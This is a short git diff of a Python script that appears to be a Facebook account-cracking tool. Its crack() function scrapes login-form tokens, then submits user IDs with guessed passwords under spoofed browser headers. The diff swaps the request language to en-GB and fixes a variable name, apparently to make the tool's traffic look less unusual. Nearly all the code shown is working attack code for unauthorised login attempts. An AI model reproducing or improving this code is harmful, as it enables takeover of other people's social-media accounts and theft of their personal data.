@@ -2,7 +2,7 @@
 #----[ jangan di oprek, sayangi data hpmu ]-----#
 author = 'Linkz'
 git_hub = 'github.com/Linkz042'
-faceb0ok = 'NONE'
+facebook = 'NONE'
 version = 'next blade v.1'
 
 
@@ -660,7 +660,7 @@ def crack(idf,pwx,url,awal):
 			date = {"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),"email":idf,"pass":pw,"next":"https://"+url+"/login/save-device/?login_source=login"}
 			hd2 = {'accept': '*/*',
 				'accept-encoding': 'gzip, deflate, br',
-				'accept-language': 'id,en-US;q=0.9,en;q=0.8',
+				'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
 				'content-type': 'application/x-www-form-urlencoded',
 				'Host': url,
 				'origin': 'https://'+url,
